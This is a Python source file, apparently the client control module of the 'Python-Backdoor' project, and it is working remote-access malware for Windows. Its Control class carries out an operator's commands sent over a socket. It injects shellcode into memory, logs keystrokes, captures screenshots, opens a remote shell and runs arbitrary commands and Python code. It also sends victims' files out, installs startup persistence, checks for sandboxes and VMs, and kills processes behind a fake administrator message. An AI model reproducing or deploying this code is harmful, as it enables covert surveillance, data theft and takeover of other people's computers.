"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import ctypes
import socket
import subprocess
import threading
import platform
from io import BytesIO, StringIO

import pyscreeze
import pythoncom
import wmi

from src import helper, errors
from src.client import persistence
from src.defs import *
from src.client.keylogger import Keylogger


def message_box(message, title="Message", values=0x40000):
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, values)).start()


def lock():
    ctypes.windll.user32.LockWorkStation()


def get_info():
    _hostname = socket.gethostname()
    _platform = f"{platform.system()} {platform.release()}"

    if persistence.detect_sandboxie():
        _platform += " (Sandboxie) "
    if persistence.detect_vm():
        _platform += " (Virtual Machine) "

    info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
            "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
            "machine": platform.machine(), "processor": platform.processor()}

    return info


class Control:
    def __init__(self, socket):
        self.socket = socket
        self.logger = Keylogger()
        self.disabled_processes = {}

    # currently, only works on x86 python, currently no solution including one below has worked with x64
    # https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
    def inject(self, shellcode):
        if ctypes.sizeof(ctypes.c_voidp) != 4:
            self.socket.send_json(ERROR, "This feature is only supported with x86 python")
        else:
            try:
                shellcode = bytearray(shellcode)

                ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
                ctypes.windll.kernel32.RtlMoveMemory.argTypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

                ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)),
                                                          ctypes.c_int(0x3000), ctypes.c_int(0x40))

                buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))

                ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0),
                                                    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
            except Exception as e:
                self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
            else:
                self.socket.send_json(SUCCESS)

    def toggle_disable_process(self, process):
        process = process.lower()

        if process in self.disabled_processes.keys() and self.disabled_processes.get(process):
            self.disabled_processes[process] = False
            self.socket.send_json(SUCCESS, f"process {process} re-enabled")
            return
        else:
            self.disabled_processes[process] = True
            self.socket.send_json(SUCCESS, f"process {process} disabled")

        # kill process if its running
        subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                         stdin=subprocess.PIPE, shell=True)

        def block_process(fake_error_message=True):
            pythoncom.CoInitialize()

            c = wmi.WMI(moniker="winmgmts:{impersonationLevel=impersonate}!//./root/cimv2")

            watcher = c.watch_for(raw_wql="SELECT * from __instancecreationevent within 1 WHERE TargetInstance isa "
                                          "'Win32_Process'")

            while True:
                process_wmi = watcher()

                if not self.disabled_processes.get(process):
                    break

                if process_wmi.Name.lower() == process:
                    process_wmi.Terminate()

                    if fake_error_message:
                        message_box(f"{process} has been disabled by your administrator", title=process,
                                    values=0x0 | 0x10 | 0x40000)

        threading.Thread(target=block_process, daemon=True).start()

    def add_startup(self, remove=False):
        try:
            if remove:
                persistence.remove_from_startup()
            else:
                persistence.add_startup()

            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.Persistence.StartupError as e:
            self.socket.send_json(ERROR, str(e))

    def close(self):
        self.socket.close()
        sys.exit(0)

    def keylogger_dump(self):
        try:
            self.socket.sendall_json(SUCCESS, helper.decode(self.logger.dump_logs().encode()))
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def keylogger_start(self):
        self.logger.start()

    def keylogger_stop(self):
        try:
            self.logger.stop()
            self.socket.send_json(SUCCESS)
        except errors.ClientSocket.KeyloggerError as e:
            self.socket.send_json(ERROR, str(e))

    def screenshot(self):
        image = pyscreeze.screenshot()
        with BytesIO() as _bytes:
            image.save(_bytes, format="PNG")
            image_bytes = _bytes.getvalue()

        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, is_bytes=True)

    def shutdown(self, shutdown_type, timeout):
        command = f"shutdown {shutdown_type} -f -t {str(timeout)}"
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                         shell=True)
        self.socket.close()
        sys.exit(0)

    def run_command(self, command):
        _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                    shell=True)
        output = _command.stdout.read() + _command.stderr.read()

        self.socket.sendall_json(SUCCESS, helper.decode(output))

    def command_shell(self):
        current_dir = os.getcwd()

        self.socket.send_json(SERVER_SHELL_DIR, current_dir)

        while True:
            data = self.socket.recv_json()

            if data["key"] == CLIENT_SHELL_CMD:
                command_request = data["value"]

                if command_request[:2].lower() == "cd" or command_request[:5].lower() == "chdir":
                    command = subprocess.Popen(f"{command_request} & cd", stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE, shell=True)

                    if command.stderr.read().decode() == "":  # if there is no error
                        output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                        os.chdir(output)  # change directory

                        self.socket.send_json(SERVER_SHELL_DIR, os.getcwd())
                else:
                    command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE,
                                               shell=True)
                    output = command.stdout.read() + command.stderr.read()

                    self.socket.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))

            elif data["key"] == CLIENT_SHELL_LEAVE:
                os.chdir(current_dir)  # change directory back to original
                break

    def upload(self, buffer, file_path):
        output = self.socket.recvall(buffer)

        try:
            with open(file_path, "wb") as file:
                file.write(output)

            self.socket.send_json(SUCCESS)
        except Exception as e:
            self.socket.send_json(ERROR, f"Could not open file {e}")

    def receive(self, file):
        try:
            with open(file, "rb") as _file:
                data = _file.read()

            self.socket.sendall_json(SERVER_FILE_RECV, data, is_bytes=True)
        except Exception as e:
            self.socket.send_json(ERROR, f"Error reading file {e}")

    def python_interpreter(self):
        while True:
            command = self.socket.recv_json()

            if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
                old_stdout = sys.stdout
                redirected_output = sys.stdout = StringIO()

                try:
                    exec(command["value"])
                    print()
                    error = None
                except Exception as e:
                    error = f"{e.__class__.__name__}: "
                    try:
                        error += f"{e.args[0]}"
                    except:
                        pass
                finally:
                    sys.stdout = old_stdout

                if error:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                else:
                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                             helper.decode(redirected_output.getvalue().encode()))
            elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
                break